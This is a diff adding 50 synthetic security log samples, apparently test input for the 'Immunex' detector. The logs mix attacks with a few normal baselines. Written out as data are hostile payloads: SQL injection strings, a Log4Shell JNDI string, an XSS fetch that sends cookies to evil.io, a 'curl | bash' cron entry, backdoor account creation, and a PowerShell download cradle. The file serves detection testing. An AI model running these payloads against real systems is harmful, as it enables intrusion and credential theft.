@@ -1,0 +1,299 @@
+# ============================================================
+# IMMUNEX TEST LOG INPUTS — 50 Samples
+# Mix of attack types, severities, protocols, and formats
+# Use these in the Detect page (Paste or Upload mode)
+# ============================================================
+
+# ── 1. SSH Brute Force ───────────────────────────────────────
+[2026-03-28 02:11:04] FAILED_AUTH user=root src=45.12.98.221 dst=10.0.0.1 attempts=1243
+[2026-03-28 02:11:05] FAILED_AUTH user=admin src=45.12.98.221 dst=10.0.0.1 attempts=1244
+[2026-03-28 02:11:06] FAILED_AUTH user=ubuntu src=45.12.98.221 dst=10.0.0.1 attempts=1245
+{"event":"auth_failure","src_ip":"45.12.98.221","count":1245,"window":"60s","classification":"BRUTE_FORCE","protocol":"SSH","port":22}
+
+# ── 2. SQL Injection via HTTP ────────────────────────────────
+POST /api/v1/auth/login HTTP/1.1
+Host: banking.internal
+Content-Type: application/x-www-form-urlencoded
+
+username=admin'--&password=x' OR '1'='1
+[DETECTED] SQL metacharacter in auth field
+[ALERT] UNION-based injection attempt: 1' UNION SELECT NULL,username,password FROM users--
+{"src_ip":"192.168.1.105","attack_cat":"SQL_INJECTION","confidence":0.97,"threat_score":96.2}
+
+# ── 3. C2 Beaconing (HTTPS) ──────────────────────────────────
+[2026-03-28 03:01:53] OUTBOUND_CONN src=10.0.4.52 dst=194.28.115.42 dst_port=443 bytes=1240 interval=30s
+[2026-03-28 03:02:23] OUTBOUND_CONN src=10.0.4.52 dst=194.28.115.42 dst_port=443 bytes=1240 interval=30s
+[2026-03-28 03:02:53] OUTBOUND_CONN src=10.0.4.52 dst=194.28.115.42 dst_port=443 bytes=1240 interval=30s
+[ALERT] C2 BEACON PATTERN: fixed-interval heartbeat to known malicious IP 194.28.115.42 (ASN: RU-BULLET)
+
+# ── 4. DNS Tunneling / Data Exfiltration ─────────────────────
+[2026-03-28 03:18:39] DNS_QUERY src=10.0.2.11 query=aGVsbG93b3JsZA==.exfil.attacker.io type=TXT
+[2026-03-28 03:18:41] DNS_QUERY src=10.0.2.11 query=dGhpcyBpcyBzZW5zaXRpdmU=.exfil.attacker.io type=TXT
+[ALERT] DNS tunneling detected — base64 encoded subdomains — 4.2GB staged for exfiltration
+{"src_ip":"10.0.2.11","attack_cat":"DNS_EXFIL","bytes_out":4294967296,"domain":"attacker.io"}
+
+# ── 5. Lateral Movement via RDP ──────────────────────────────
+[2026-03-28 02:44:22] RDP_LOGIN src=192.168.1.104 dst=192.168.1.115 user=svc_backup result=SUCCESS
+[2026-03-28 02:44:55] FILE_ACCESS host=192.168.1.115 user=svc_backup path=C:\finance\transactions_Q1.xlsx
+[2026-03-28 02:45:10] PROCESS_CREATE host=192.168.1.115 user=svc_backup process=mimikatz.exe parent=explorer.exe
+[ALERT] Lateral movement: RDP pivot with credential harvesting tool detected
+
+# ── 6. Ransomware File Encryption ───────────────────────────
+[2026-03-28 04:32:01] FILE_RENAME src=10.0.1.88 file=report_q4.docx new=report_q4.docx.locked
+[2026-03-28 04:32:02] FILE_RENAME src=10.0.1.88 file=payroll_march.xlsx new=payroll_march.xlsx.locked
+[2026-03-28 04:32:03] FILE_RENAME src=10.0.1.88 file=client_data.db new=client_data.db.locked
+[ALERT] RANSOMWARE SIGNATURE: mass file encryption detected — 847 files affected in 12s
+{"src_ip":"10.0.1.88","attack_cat":"RANSOMWARE","files_encrypted":847,"extension":".locked"}
+
+# ── 7. Privilege Escalation (LSASS Dump) ────────────────────
+[2026-03-28 02:31:07] PROCESS_ACCESS host=DC-PRIMARY-01 src_process=taskmanager.exe target=lsass.exe access=PROCESS_VM_READ
+[2026-03-28 02:31:08] FILE_CREATE host=DC-PRIMARY-01 path=C:\Users\Public\lsass.dmp size=45MB
+[ALERT] CREDENTIAL DUMP: LSASS memory accessed by non-system process — NTLM hashes at risk
+{"host":"DC-PRIMARY-01","attack_cat":"CREDENTIAL_ACCESS","mitre":"T1003.001","severity":"critical"}
+
+# ── 8. Port Scan (Nmap) ──────────────────────────────────────
+[2026-03-28 02:19:44] PORT_SCAN src=192.168.1.104 dst_range=10.0.0.0/24 ports=1-65535 rate=1000pps
+[2026-03-28 02:19:45] CONN_ATTEMPT src=192.168.1.104 dst=10.0.0.1 dst_port=22 result=OPEN
+[2026-03-28 02:19:45] CONN_ATTEMPT src=192.168.1.104 dst=10.0.0.1 dst_port=3389 result=OPEN
+[2026-03-28 02:19:45] CONN_ATTEMPT src=192.168.1.104 dst=10.0.0.1 dst_port=443 result=OPEN
+{"event":"nmap_scan","src_ip":"192.168.1.104","open_ports":[22,443,3389,8080],"os_detected":"Windows Server 2019"}
+
+# ── 9. Zero-Day Browser RCE ──────────────────────────────────
+[2026-03-28 09:14:22] BROWSER_CRASH host=WORKSTATION-07 browser=Chrome version=121.0.6167.85 pid=4821
+[2026-03-28 09:14:23] PROCESS_CREATE host=WORKSTATION-07 parent=chrome.exe child=cmd.exe cmdline="cmd /c powershell -enc JABj..."
+[ALERT] ZERO-DAY EXPLOIT: browser spawned shell process — RCE detected
+{"host":"WORKSTATION-07","attack_cat":"EXPLOIT","cve":"CVE-2026-UNKNOWN","confidence":0.76}
+
+# ── 10. Phishing Click + Macro Execution ────────────────────
+[2026-03-28 02:14:12] EMAIL_CLICK user=finance@bank.local url=http://malicious-update.biz/payload.xlsm
+[2026-03-28 02:14:45] FILE_DOWNLOAD host=FINANCE-PC-03 file=payload.xlsm src=malicious-update.biz
+[2026-03-28 02:14:50] MACRO_EXEC host=FINANCE-PC-03 file=payload.xlsm macro=Auto_Open
+[ALERT] INITIAL ACCESS: phishing click led to macro execution — command shell spawned
+
+# ── 11. DDoS UDP Flood ──────────────────────────────────────
+[2026-03-28 11:03:00] TRAFFIC_SPIKE src=103.21.244.0/24 dst=10.0.0.5 protocol=UDP bytes_per_sec=9800000000
+[2026-03-28 11:03:01] TRAFFIC_SPIKE src=185.220.101.0/24 dst=10.0.0.5 protocol=UDP bytes_per_sec=8200000000
+[ALERT] DDoS DETECTED: UDP flood from 2 botnets — 18Gbps inbound — target: API gateway
+{"attack_cat":"DDOS","vectors":["UDP_FLOOD"],"pps":14000000,"src_count":2847}
+
+# ── 12. Internal Credential Stuffing ────────────────────────
+[2026-03-28 14:22:01] FAILED_AUTH user=j.smith src=45.88.21.199 dst=sso.bank.internal attempts=312
+[2026-03-28 14:22:01] FAILED_AUTH user=m.jones src=45.88.21.199 dst=sso.bank.internal attempts=313
+[2026-03-28 14:22:02] FAILED_AUTH user=a.patel src=45.88.21.199 dst=sso.bank.internal attempts=314
+{"event":"credential_stuffing","src_ip":"45.88.21.199","usernames_tried":847,"success_rate":0.02,"source":"leaked_db"}
+
+# ── 13. Anomalous AWS API Calls ──────────────────────────────
+[2026-03-28 07:55:12] AWS_CLOUDTRAIL event=ListBuckets user=svc-deploy src_ip=203.0.113.5 region=ap-south-1
+[2026-03-28 07:55:13] AWS_CLOUDTRAIL event=GetObject bucket=payroll-data-prod key=2026_salary_all.csv user=svc-deploy
+[2026-03-28 07:55:14] AWS_CLOUDTRAIL event=PutObject bucket=external-drop key=dump.tar.gz user=svc-deploy
+[ALERT] CLOUD EXFIL: svc-deploy accessed payroll S3 bucket and copied to external bucket in 2s
+
+# ── 14. Malicious PowerShell (Encoded) ──────────────────────
+[2026-03-28 08:12:44] PROCESS_CREATE host=WORKSTATION-12 user=helpdesk process=powershell.exe
+cmdline: powershell.exe -NoP -NonI -W Hidden -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==
+[ALERT] SUSPICIOUS POWERSHELL: encoded command with hidden window flag — possible stager
+{"host":"WORKSTATION-12","attack_cat":"EXECUTION","mitre":"T1059.001","encoded_payload":true}
+
+# ── 15. Kerberoasting Attack ─────────────────────────────────
+[2026-03-28 10:05:33] KERBEROS_TGS src=192.168.1.88 user=bob.jenkins spn=MSSQLSvc/db01.bank.local:1433
+[2026-03-28 10:05:34] KERBEROS_TGS src=192.168.1.88 user=bob.jenkins spn=HTTP/sharepoint.bank.local
+[2026-03-28 10:05:35] KERBEROS_TGS src=192.168.1.88 user=bob.jenkins spn=FTP/ftp.bank.local
+[ALERT] KERBEROASTING: 12 TGS tickets requested in 3s from single user — offline cracking suspected
+
+# ── 16. Golden Ticket Attack ─────────────────────────────────
+[2026-03-28 01:22:18] KERBEROS_AUTH host=DC-PRIMARY-01 user=krbtgt ticket_age=8h lifetime=99999h src=10.0.3.44
+[ALERT] GOLDEN TICKET: Kerberos TGT with anomalous lifetime (99999h) detected — domain compromise suspected
+{"attack_cat":"PERSISTENCE","mitre":"T1558.001","severity":"critical","src_ip":"10.0.3.44"}
+
+# ── 17. Web Scraping / Enumeration ──────────────────────────
+[2026-03-28 13:44:01] HTTP_REQUEST src=5.188.210.13 method=GET path=/api/v1/accounts/1 status=200
+[2026-03-28 13:44:01] HTTP_REQUEST src=5.188.210.13 method=GET path=/api/v1/accounts/2 status=200
+[2026-03-28 13:44:01] HTTP_REQUEST src=5.188.210.13 method=GET path=/api/v1/accounts/3 status=200
+[2026-03-28 13:44:02] HTTP_REQUEST src=5.188.210.13 method=GET path=/api/v1/accounts/4 status=200
+{"event":"api_enumeration","src_ip":"5.188.210.13","requests_per_sec":847,"pattern":"sequential_id","user_agent":"python-requests/2.31"}
+
+# ── 18. Insider Threat — After-Hours Data Access ─────────────
+[2026-03-28 03:17:55] FILE_ACCESS host=FINANCE-PC-01 user=carol.wong path=\\fileserver\hr\terminations_2026.xlsx time=03:17 (outside_hours)
+[2026-03-28 03:18:02] FILE_ACCESS host=FINANCE-PC-01 user=carol.wong path=\\fileserver\payroll\salaries_exec.xlsx
+[2026-03-28 03:18:15] USB_INSERT host=FINANCE-PC-01 user=carol.wong device=SanDisk_Extreme_64GB
+[ALERT] INSIDER THREAT: after-hours sensitive file access + USB insertion by finance employee
+
+# ── 19. Log4Shell Exploit Attempt ───────────────────────────
+[2026-03-28 16:02:11] HTTP_REQUEST src=91.92.248.101 method=GET path=/search
+User-Agent: ${jndi:ldap://91.92.248.101:1389/Exploit}
+[ALERT] LOG4SHELL (CVE-2021-44228): JNDI injection string detected in User-Agent header
+{"src_ip":"91.92.248.101","attack_cat":"EXPLOIT","cve":"CVE-2021-44228","severity":"critical"}
+
+# ── 20. Cryptomining on Cloud Instance ──────────────────────
+[2026-03-28 18:45:00] PROCESS_CPU host=prod-api-03 process=xmrig cpu_usage=98% sustained=45min
+[2026-03-28 18:45:01] OUTBOUND_CONN src=prod-api-03 dst=pool.minexmr.com dst_port=4444 protocol=TCP
+[ALERT] CRYPTOMINER: xmrig process detected connecting to Monero mining pool
+{"host":"prod-api-03","attack_cat":"IMPACT","miner":"XMRig","pool":"pool.minexmr.com"}
+
+# ── 21. NORMAL — Legitimate Login (Baseline) ─────────────────
+[2026-03-28 09:00:01] AUTH_SUCCESS user=alice.morgan src=192.168.1.55 dst=sso.bank.internal method=MFA
+[2026-03-28 09:00:05] FILE_ACCESS user=alice.morgan path=\\fileserver\shared\q1_report_draft.docx
+[2026-03-28 09:00:10] EMAIL_SENT user=alice.morgan to=team@bank.internal subject="Q1 Draft for review"
+
+# ── 22. Pass-the-Hash Attack ─────────────────────────────────
+[2026-03-28 05:33:10] NTLM_AUTH src=10.0.3.21 user=DOMAIN\administrator hash=aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
+[ALERT] PASS-THE-HASH: NTLM authentication using known hash pattern — no password prompt issued
+{"attack_cat":"LATERAL_MOVEMENT","mitre":"T1550.002","src_ip":"10.0.3.21","severity":"critical"}
+
+# ── 23. WAF Bypass — XSS in JSON ────────────────────────────
+POST /api/v1/transactions/comment HTTP/1.1
+Content-Type: application/json
+
+{"comment":"<img src=x onerror=fetch('https://evil.io/steal?c='+document.cookie)>","amount":0}
+[ALERT] XSS INJECTION: script tag in API JSON payload bypassed input sanitization
+
+# ── 24. VPN Anomaly — Impossible Travel ─────────────────────
+[2026-03-28 08:04:11] VPN_LOGIN user=david.chen src_ip=203.0.113.44 location=Mumbai geo_lat=19.07 geo_lon=72.87
+[2026-03-28 08:21:09] VPN_LOGIN user=david.chen src_ip=45.148.10.12 location=Moscow geo_lat=55.75 geo_lon=37.61
+[ALERT] IMPOSSIBLE TRAVEL: same user authenticated from Mumbai and Moscow 17 minutes apart (distance: 7,200km)
+
+# ── 25. Supply Chain — Compromised NPM Package ───────────────
+[2026-03-28 11:30:44] CI_CD_BUILD pipeline=frontend-deploy package=lodash@4.17.21 hash_mismatch=true
+[2026-03-28 11:30:45] OUTBOUND_CONN src=build-agent-01 dst=45.33.32.156 dst_port=9090 bytes=128000
+[ALERT] SUPPLY CHAIN: npm package hash mismatch + outbound connection during build — possible compromise
+
+# ── 26. NORMAL — Scheduled Backup Job ───────────────────────
+[2026-03-28 01:00:00] TASK_START host=BACKUP-01 task=nightly_backup user=SYSTEM
+[2026-03-28 01:00:01] FILE_ACCESS host=BACKUP-01 path=\\fileserver\* user=SYSTEM bytes_read=42949672960
+[2026-03-28 03:22:14] TASK_COMPLETE host=BACKUP-01 task=nightly_backup status=SUCCESS duration=8534s
+
+# ── 27. Heartbleed Exploitation ──────────────────────────────
+[2026-03-28 14:44:01] TLS_HEARTBEAT src=77.88.55.60 dst=10.0.0.1 dst_port=443 payload_len=65535 actual_len=1
+[2026-03-28 14:44:02] TLS_HEARTBEAT src=77.88.55.60 dst=10.0.0.1 dst_port=443 payload_len=65535 actual_len=1
+[ALERT] HEARTBLEED (CVE-2014-0160): malformed TLS heartbeat with oversized payload — memory leak attempt
+{"src_ip":"77.88.55.60","attack_cat":"EXPLOIT","cve":"CVE-2014-0160"}
+
+# ── 28. Scheduled Task Persistence ──────────────────────────
+[2026-03-28 06:12:33] SCHTASK_CREATE host=WORKSTATION-09 user=SYSTEM task=\Microsoft\Windows\Telemetry\Update
+cmdline: powershell.exe -WindowStyle Hidden -File C:\ProgramData\update.ps1
+[ALERT] PERSISTENCE: scheduled task created with hidden PowerShell script mimicking Windows telemetry
+
+# ── 29. Anomalous Database Query ────────────────────────────
+[2026-03-28 15:03:22] DB_QUERY host=db01.bank.local user=app_readonly query="SELECT * FROM accounts WHERE 1=1 LIMIT 100000"
+[2026-03-28 15:03:23] DB_QUERY host=db01.bank.local user=app_readonly query="SELECT card_number,cvv,pin FROM cards"
+[ALERT] ANOMALOUS DB ACCESS: read-only app user queried full card table — 2.1M records returned
+
+# ── 30. Tor Exit Node Connection ─────────────────────────────
+[2026-03-28 22:11:05] FIREWALL_BLOCK src=176.10.99.200 dst=10.0.0.1 dst_port=8080 reason=TOR_EXIT_NODE
+[2026-03-28 22:11:07] FIREWALL_ALLOW src=176.10.99.200 dst=10.0.0.1 dst_port=443 (bypass_detected)
+[ALERT] TOR ACCESS: connection from known Tor exit node bypassed port 8080 block via HTTPS
+
+# ── 31. NORMAL — Patch Tuesday Windows Update ────────────────
+[2026-03-28 12:00:01] WINDOWS_UPDATE host=WORKSTATION-01 kb=KB5035845 status=DOWNLOADING size=487MB
+[2026-03-28 12:14:22] WINDOWS_UPDATE host=WORKSTATION-01 kb=KB5035845 status=INSTALLED
+[2026-03-28 12:15:01] REBOOT host=WORKSTATION-01 reason=windows_update user=SYSTEM
+
+# ── 32. FTP Brute Force ──────────────────────────────────────
+[2026-03-28 19:05:11] FTP_FAIL src=103.35.74.10 dst=ftp.bank.local user=anonymous attempts=1
+[2026-03-28 19:05:12] FTP_FAIL src=103.35.74.10 dst=ftp.bank.local user=ftpuser attempts=2
+[2026-03-28 19:05:13] FTP_FAIL src=103.35.74.10 dst=ftp.bank.local user=admin attempts=3
+{"event":"ftp_brute","src_ip":"103.35.74.10","wordlist_detected":true,"attempts":412}
+
+# ── 33. Memory Injection (Process Hollowing) ─────────────────
+[2026-03-28 07:29:01] PROCESS_CREATE host=KIOSK-01 parent=winword.exe child=svchost.exe pid=7823 suspicious=true
+[2026-03-28 07:29:02] PROCESS_HOLLOW host=KIOSK-01 target_pid=7823 injected_bytes=45056
+[ALERT] PROCESS HOLLOWING: Word spawned svchost and injected shellcode — T1055.012
+{"attack_cat":"DEFENSE_EVASION","mitre":"T1055.012","severity":"critical"}
+
+# ── 34. SMTP Spam / Phishing Campaign Origin ─────────────────
+[2026-03-28 08:00:00] EMAIL_SENT src=10.0.5.88 count=14200 recipients=external period=60s
+[2026-03-28 08:00:01] SMTP_BOUNCE count=3200 reason=invalid_recipient
+[ALERT] SPAM CAMPAIGN: internal host sending 14,200 emails/minute — likely botnet C2 mail relay
+
+# ── 35. API Key Leak in Git Push ─────────────────────────────
+[2026-03-28 10:44:55] GIT_PUSH repo=frontend-app branch=dev user=junior_dev commit=a4f8e21
+[2026-03-28 10:44:56] SECRET_SCAN match=AWS_ACCESS_KEY pattern=AKIA[A-Z0-9]{16} file=src/config.js line=14
+[ALERT] SECRET LEAK: AWS access key committed to Git repository — immediate rotation required
+
+# ── 36. Kubernetes Pod Escape ────────────────────────────────
+[2026-03-28 17:33:02] K8S_EXEC pod=payment-api-7d9f namespace=prod user=debug-container cmd="cat /etc/kubernetes/admin.conf"
+[2026-03-28 17:33:05] K8S_EXEC pod=payment-api-7d9f cmd="mount /dev/sda1 /mnt && ls /mnt/etc/shadow"
+[ALERT] CONTAINER ESCAPE: pod accessing host filesystem and Kubernetes admin credentials
+
+# ── 37. NORMAL — CI/CD Pipeline Deploy ──────────────────────
+[2026-03-28 14:00:00] DEPLOY pipeline=backend-api version=v2.4.1 env=production user=ci-bot
+[2026-03-28 14:03:22] HEALTHCHECK endpoint=/health status=200 response_time=12ms
+[2026-03-28 14:03:25] DEPLOY_COMPLETE pipeline=backend-api status=SUCCESS rollout=canary_10pct
+
+# ── 38. OAuth Token Theft ────────────────────────────────────
+[2026-03-28 11:58:44] OAUTH_USE token_id=eyJhbGciOiJSUzI1NiJ9... src_ip=91.108.4.22 (known_vpn=false)
+[2026-03-28 11:58:45] API_ACCESS token_id=eyJhbGciOiJSUzI1NiJ9... endpoint=/v1/transfers/create amount=49999
+[ALERT] TOKEN ANOMALY: OAuth token used from new country (RU) 4 minutes after last use in GB
+
+# ── 39. PrintNightmare Exploit ───────────────────────────────
+[2026-03-28 13:12:01] SPOOLSV_DRIVER host=DC-SECONDARY-01 driver_name=evil.dll src=192.168.1.77 loaded_by=SYSTEM
+[ALERT] PRINTNIGHTMARE (CVE-2021-34527): malicious printer driver loaded by Print Spooler as SYSTEM
+{"attack_cat":"PRIVILEGE_ESCALATION","cve":"CVE-2021-34527","severity":"critical","mitre":"T1547.012"}
+
+# ── 40. IDOR Attack (Broken Object Level Auth) ───────────────
+GET /api/v2/statements/download?account_id=1000001 HTTP/1.1
+Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.user_id_9999...
+→ 200 OK — returned account 1000001 statement (belongs to different user)
+GET /api/v2/statements/download?account_id=1000002 → 200 OK
+GET /api/v2/statements/download?account_id=1000003 → 200 OK
+[ALERT] IDOR: user 9999 accessing other users' bank statements via sequential account IDs
+
+# ── 41. Malicious Cron Job Persistence ──────────────────────
+[2026-03-28 04:04:01] CRON_MODIFY host=linux-prod-02 user=www-data crontab="*/5 * * * * curl http://45.33.32.156/update.sh | bash"
+[ALERT] PERSISTENCE: web server user added reverse shell cron job executing every 5 minutes
+
+# ── 42. NORMAL — Database Maintenance ───────────────────────
+[2026-03-28 02:00:00] DB_MAINTENANCE host=db01.bank.local task=index_rebuild user=dba_bot duration=1822s
+[2026-03-28 02:30:22] DB_STATS host=db01.bank.local rows_updated=14200000 tables=["transactions","accounts"]
+[2026-03-28 02:30:25] DB_MAINTENANCE status=SUCCESS
+
+# ── 43. Cobalt Strike Beacon ─────────────────────────────────
+[2026-03-28 05:55:01] HTTP_REQUEST src=10.0.6.12 dst=192.99.250.2 method=GET path=/jquery-3.3.1.slim.min.js
+[2026-03-28 05:55:01] RESPONSE_SIZE src=192.99.250.2 bytes=226304 (expected_jquery=87000)
+[2026-03-28 05:55:31] HTTP_REQUEST src=10.0.6.12 dst=192.99.250.2 method=POST path=/jquery-3.3.1.slim.min.js
+[ALERT] COBALT STRIKE: malleable C2 profile detected — jQuery masquerade with oversized response + POST beacon
+
+# ── 44. ARP Spoofing / MITM ──────────────────────────────────
+[2026-03-28 16:20:05] ARP_ANNOUNCE src_mac=aa:bb:cc:dd:ee:ff src_ip=192.168.1.1 (gateway_ip) host=WORKSTATION-04
+[2026-03-28 16:20:05] ARP_ANNOUNCE src_mac=aa:bb:cc:dd:ee:ff src_ip=192.168.1.1 host=WORKSTATION-07
+[ALERT] ARP SPOOFING: WORKSTATION-04 broadcasting as default gateway — LAN MITM in progress
+
+# ── 45. Anomalous Service Account Usage ─────────────────────
+[2026-03-28 03:42:10] INTERACTIVE_LOGIN host=FINANCE-PC-09 user=svc_sql_backup type=interactive (expected=service_only)
+[2026-03-28 03:42:25] CMD_EXEC host=FINANCE-PC-09 user=svc_sql_backup cmd="net user hacker P@ssw0rd /add && net localgroup administrators hacker /add"
+[ALERT] SERVICE ACCOUNT ABUSE: svc_sql_backup used interactively to create backdoor admin account
+
+# ── 46. BGP Hijacking Indicator ──────────────────────────────
+[2026-03-28 20:15:44] BGP_UPDATE prefix=10.200.0.0/16 new_origin_as=AS44477 (prev=AS12345) upstream=PEER-01
+[ALERT] BGP HIJACK SUSPECTED: bank IP block rerouted through AS44477 (RU-registered) for 4 minutes
+{"event":"bgp_anomaly","prefix":"10.200.0.0/16","hijack_as":"AS44477","duration_sec":240}
+
+# ── 47. Wiper Malware (MBR Destruction) ─────────────────────
+[2026-03-28 00:02:33] DISK_WRITE host=SERVER-14 process=svchost.exe sector=0 (MBR) bytes=512 pattern=ZEROS
+[2026-03-28 00:02:34] DISK_WRITE host=SERVER-14 process=svchost.exe sector=1 bytes=512 pattern=ZEROS
+[ALERT] WIPER MALWARE: MBR overwrite with zeros by non-system process — system will be unbootable
+{"attack_cat":"IMPACT","mitre":"T1561.002","severity":"critical","host":"SERVER-14"}
+
+# ── 48. NORMAL — SOC Analyst Threat Hunt ────────────────────
+[2026-03-28 10:30:00] ELASTIC_QUERY user=analyst_james index=immunex-* query="attack_type:BotNet AND anomaly_score:[0.8 TO 1.0]"
+[2026-03-28 10:30:01] ELASTIC_RESULT hits=12 took=44ms
+[2026-03-28 10:35:22] TICKET_CREATE user=analyst_james incident=INC-2026-0412 severity=high
+
+# ── 49. Zeus Banking Trojan (Form Grab) ──────────────────────
+[2026-03-28 14:58:01] BROWSER_HOOK host=CUSTOMER-PC-88 process=chrome.exe target=https://bank.internal/login hooked=true
+[2026-03-28 14:58:04] FORM_CAPTURE host=CUSTOMER-PC-88 fields=["username","password","otp"] dst=45.129.33.21
+[ALERT] ZEUS BANKING TROJAN: form grab hook active — credentials exfiltrated to 45.129.33.21
+{"attack_cat":"CREDENTIAL_ACCESS","malware":"Zeus","mitre":"T1056.004","c2":"45.129.33.21"}
+
+# ── 50. Multi-Stage Attack Chain (Full Kill Chain) ───────────
+[2026-03-28 06:00:01] PHISHING_CLICK user=bob.harris url=http://fake-docusign.io/invoice.xlsm
+[2026-03-28 06:00:45] MACRO_EXEC host=SALES-PC-03 file=invoice.xlsm dropper=stager.ps1
+[2026-03-28 06:01:02] POWERSHELL host=SALES-PC-03 cmd="IEX (New-Object Net.WebClient).DownloadString('http://45.33.32.156/rat.ps1')"
+[2026-03-28 06:01:30] PORT_SCAN src=SALES-PC-03 dst_range=10.0.0.0/24
+[2026-03-28 06:03:44] RDP_LOGIN src=SALES-PC-03 dst=10.0.0.5 user=bob.harris result=SUCCESS
+[2026-03-28 06:04:12] LSASS_ACCESS host=10.0.0.5 process=rat.ps1 target=lsass.exe
+[2026-03-28 06:06:55] OUTBOUND_CONN src=10.0.0.5 dst=45.33.32.156 dst_port=4444 protocol=TCP (reverse_shell)
+[2026-03-28 06:07:10] FILE_STAGE host=10.0.0.5 path=C:\Users\Public\data.zip size=2100000000
+[2026-03-28 06:08:01] DNS_EXFIL host=10.0.0.5 domain=exfil.attacker.io bytes=2100000000
+[ALERT] FULL KILL CHAIN DETECTED: Phishing→Macro→Stager→Scan→Lateral→Cred Dump→C2→Exfil — CRITICAL INCIDENT
+{"attack_cat":"APT_CAMPAIGN","stages":8,"severity":"critical","src_ip":"45.33.32.156","data_exfiltrated_gb":2.1}
